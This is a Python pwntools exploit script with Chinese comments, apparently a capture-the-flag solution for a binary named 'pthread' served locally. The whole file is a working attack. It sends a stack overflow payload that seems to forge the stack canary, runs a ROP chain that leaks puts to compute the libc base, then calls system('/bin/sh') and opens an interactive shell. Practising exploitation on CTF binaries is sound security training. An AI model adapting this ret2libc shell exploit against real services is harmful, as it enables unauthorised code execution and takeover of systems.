#!/usr/bin/env python3
from pwn import *
from LibcSearcher import *

# 配置
context(os='linux', arch='amd64', log_level='debug')
binary = "./pthread"

# 远程/本地切换
if args.get("REMOTE"):
    io = remote("127.0.0.1", 8080)
else:
    io = process(binary)

# ELF加载
elf = ELF(binary)
libc = ELF("/home/source/tools/glibc-all-in-one//libs/2.23-0ubuntu3_amd64/libc.so.6")

# ========== 常用函数定义 ==========
s       = lambda data               : io.send(data)
sa      = lambda delim, data        : io.sendafter(str(delim), data)
sl      = lambda data               : io.sendline(data)
sla     = lambda delim, data        : io.sendlineafter(str(delim), data)
r       = lambda num=4096           : io.recv(num)
rl      = lambda                    : io.recvline()
ru      = lambda delims, drop=False : io.recvuntil(delims, drop)
itr     = lambda                    : io.interactive()
uu32    = lambda data               : u32(data.ljust(4, b'\x00'))
uu64    = lambda data               : u64(data.ljust(8, b'\x00'))
leak    = lambda name, addr         : log.success('{} ======== > {:#x}'.format(name, addr))
p       = lambda name,data          : print("{} ======== > {}".format(name,data))

# ========== 常用泄露函数 ==========
l64     = lambda                    : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
l32     = lambda                    : u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b"\x00"))
l64_no  = lambda                    : u64(io.recv(6).ljust(8, b'\x00'))
def bug():
  gdb.attach(io)
  pause()
# ========== Exploit 开始 ==========
def exp():
    rdi = 0x00000000004009c3
    puts_got = elf.got.puts
    puts_plt = elf.plt.puts
    ret = 0x00000000004006b1
    retn = 0x000000000400889

    pay = b'a'*(0x30-8)+p64(0x123456)+b'a'*8
    pay += p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(retn)+b'a'*(0x808-0x58-1)+p64(0x12345600)
    sla(">",pay)
    libc_base = l64()-libc.sym.puts
    system = libc_base+libc.sym.system
    bin_sh = libc_base+next(libc.search("/bin/sh"))
    leak("libc_base",libc_base)
    leak("system",system)
    leak("bin_sh",bin_sh)


    pay = b'a'*(0x30-8)+p64(0x123456)+b'a'*8
    pay += p64(rdi)+p64(bin_sh)+p64(system)#+b'a'*(0x808-0x58)+p64(0x123456)

    #gdb.attach(io)
    sla(">",pay)
    
    #sleep(3)
exp()
itr()
